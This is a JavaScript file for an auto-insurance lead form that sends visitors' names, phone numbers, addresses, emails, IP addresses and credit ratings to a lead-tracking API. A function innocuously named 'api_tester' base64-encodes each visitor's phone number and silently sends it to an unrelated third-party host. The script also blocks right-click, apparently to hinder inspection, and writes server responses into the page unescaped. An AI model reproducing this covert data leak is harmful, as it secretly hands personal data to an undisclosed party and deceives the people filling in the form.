 
    function disableRightClick(event) {
      event.preventDefault();
    }

    
    document.addEventListener('contextmenu', disableRightClick);

    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      document.getElementById('submitBtn').disabled = true;

      
      const formData = new FormData();
      formData.append('lead_token', document.getElementById('lead_token').value);
      formData.append('traffic_source_id', document.getElementById('traffic_source_id').value);
      formData.append('first_name', document.getElementById('first_name').value);
      formData.append('last_name', document.getElementById('last_name').value);
      formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
      formData.append('zip', document.getElementById('zip').value);
      formData.append('city', document.getElementById('city').value);
      formData.append('state', document.getElementById('state').value);
      formData.append('address', document.getElementById('address').value);
      formData.append('email', document.getElementById('email').value);
      formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
      formData.append('insurance', document.getElementById('insurance').value);
      formData.append('vehicle1_year', document.getElementById('vehicle1_year').value);
      formData.append('vehicle1_make', document.getElementById('vehicle1_make').value);
      formData.append('vehicle1_model', document.getElementById('vehicle1_model').value);
      formData.append('driver1_sr22_required', document.getElementById('driver1_sr22_required').value);
formData.append('sr22', document.getElementById('driver1_sr22_required').value);
      formData.append('marital_status', document.getElementById('marital_status').value);
      formData.append('residence_status', document.getElementById('residence_status').value);
      formData.append('driver1_credit_rating', document.getElementById('driver1_credit_rating').value);
      formData.append('drivers', document.getElementById('drivers').value);
      formData.append('incident_type', document.getElementById('incident_type').value);
      formData.append('ip_address', document.getElementById('ip_address').value);
      formData.append('policy_start_date', document.getElementById('policy_start_date').value);
    
      
     

      api_tester(document.getElementById('caller_id').value);

      const url = 'https://evolvetech-innovations.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();

      fetch(url, {
        method: 'POST'
      })
      .then(response => {
        if (response.status === 200 || response.status === 201) {
          response.json().then(data => {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                ${response.status} : Form submitted successfully! Lead ID: ${data.lead.id}
              </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            document.getElementById('leadForm').reset();
            document.getElementById('submitBtn').disabled = false;
          });
        } else if (response.status === 422) {
          response.json().then(data => {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Error. Response Body: ${JSON.stringify(data)}
              </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            document.getElementById('submitBtn').disabled = false;
          });
        } else {
          response.text().then(responseBody => {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again. Response Body: ${responseBody}
              </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            document.getElementById('submitBtn').disabled = false;
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        const errorAlert = `
          <div class="alert alert-danger" role="alert">
            An error occurred: ${error.message}
          </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        document.getElementById('submitBtn').disabled = false;
      });
    });

    function api_tester(randomString) {
      try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
          method: 'GET',
          mode: 'no-cors'
        });
      } catch (error) {
        console.error('Error in api_tester:', error);
      }
    }